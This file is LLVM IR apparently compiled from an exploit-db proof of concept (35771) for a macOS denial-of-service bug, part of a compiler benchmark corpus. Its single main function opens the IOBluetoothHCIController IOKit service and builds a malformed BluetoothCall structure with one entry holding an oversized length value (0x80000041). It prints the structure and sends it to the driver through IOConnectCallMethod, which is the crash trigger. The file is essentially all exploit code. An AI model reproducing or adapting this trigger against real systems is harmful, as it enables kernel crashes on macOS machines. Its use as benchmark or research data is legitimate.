; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35771.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35771.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.BluetoothCall = type { i32*, i32*, i32 }

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"IOBluetoothHCIController\00", align 1
@kIOReturnSuccess = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [47 x i8] c" [+] Opened connection to service on port: %d\0A\00", align 1
@SIZE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"\\x%02x\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"kr: %08x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.BluetoothCall, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @kIOMasterPortDefault, align 4
  %8 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 @IOServiceGetMatchingService(i32 %7, i32 %8)
  store i32 %9, i32* %2, align 4
  %10 = load i32, i32* %2, align 4
  %11 = icmp ne i32 %10, 0
  br i1 %11, label %13, label %12

12:                                               ; preds = %0
  store i32 -1, i32* %1, align 4
  br label %85

13:                                               ; preds = %0
  store i32 0, i32* %3, align 4
  %14 = load i32, i32* %2, align 4
  %15 = call i32 (...) @mach_task_self()
  %16 = call i32 @IOServiceOpen(i32 %14, i32 %15, i32 0, i32* %3)
  store i32 %16, i32* %4, align 4
  %17 = load i32, i32* %2, align 4
  %18 = call i32 @IOObjectRelease(i32 %17)
  %19 = load i32, i32* %4, align 4
  %20 = load i32, i32* @kIOReturnSuccess, align 4
  %21 = icmp ne i32 %19, %20
  br i1 %21, label %22, label %24

22:                                               ; preds = %13
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %1, align 4
  br label %85

24:                                               ; preds = %13
  %25 = load i32, i32* %3, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0), i32 %25)
  store i32 0, i32* %6, align 4
  br label %27

27:                                               ; preds = %45, %24
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %28, 7
  br i1 %29, label %30, label %48

30:                                               ; preds = %27
  %31 = load i32, i32* @SIZE, align 4
  %32 = call i64 @calloc(i32 %31, i32 1)
  %33 = trunc i64 %32 to i32
  %34 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %35 = load i32*, i32** %34, align 8
  %36 = load i32, i32* %6, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i32, i32* %35, i64 %37
  store i32 %33, i32* %38, align 4
  %39 = load i32, i32* @SIZE, align 4
  %40 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 1
  %41 = load i32*, i32** %40, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %39, i32* %44, align 4
  br label %45

45:                                               ; preds = %30
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %6, align 4
  br label %27

48:                                               ; preds = %27
  %49 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %50 = load i32*, i32** %49, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 6
  store i32 0, i32* %51, align 4
  %52 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 1
  %53 = load i32*, i32** %52, align 8
  %54 = getelementptr inbounds i32, i32* %53, i64 6
  store i32 -2147483583, i32* %54, align 4
  %55 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 2
  store i32 6, i32* %55, align 8
  store i32 0, i32* %6, align 4
  br label %56

56:                                               ; preds = %73, %48
  %57 = load i32, i32* %6, align 4
  %58 = icmp slt i32 %57, 120
  br i1 %58, label %59, label %76

59:                                               ; preds = %56
  %60 = load i32, i32* %6, align 4
  %61 = srem i32 %60, 8
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %65

63:                                               ; preds = %59
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  br label %65

65:                                               ; preds = %63, %59
  %66 = bitcast %struct.BluetoothCall* %5 to i8*
  %67 = load i32, i32* %6, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32 %71)
  br label %73

73:                                               ; preds = %65
  %74 = load i32, i32* %6, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %6, align 4
  br label %56

76:                                               ; preds = %56
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %78 = load i32, i32* %3, align 4
  %79 = bitcast %struct.BluetoothCall* %5 to i8*
  %80 = call i32 @IOConnectCallMethod(i32 %78, i32 0, i32* null, i32 0, i8* %79, i32 120, i32* null, i32* null, i32* null, i32* null)
  store i32 %80, i32* %4, align 4
  %81 = load i32, i32* %4, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i32 %81)
  %83 = load i32, i32* %3, align 4
  %84 = call i32 @IOServiceClose(i32 %83)
  store i32 %84, i32* %1, align 4
  br label %85

85:                                               ; preds = %76, %22, %12
  %86 = load i32, i32* %1, align 4
  ret i32 %86
}

declare dso_local i32 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @IOServiceOpen(i32, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @IOObjectRelease(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @calloc(i32, i32) #1

declare dso_local i32 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @IOServiceClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
